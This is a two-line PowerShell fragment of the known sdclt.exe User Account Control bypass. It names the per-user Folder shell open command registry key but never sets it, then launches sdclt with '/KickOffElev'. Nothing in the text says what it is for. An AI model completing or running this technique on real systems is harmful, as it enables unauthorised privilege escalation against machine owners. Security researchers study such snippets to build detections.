$unused = 'HKCU:\Software\Classes\Folder\shell\open\command'
Start-Process sdclt.exe -ArgumentList '/KickOffElev' -Wait
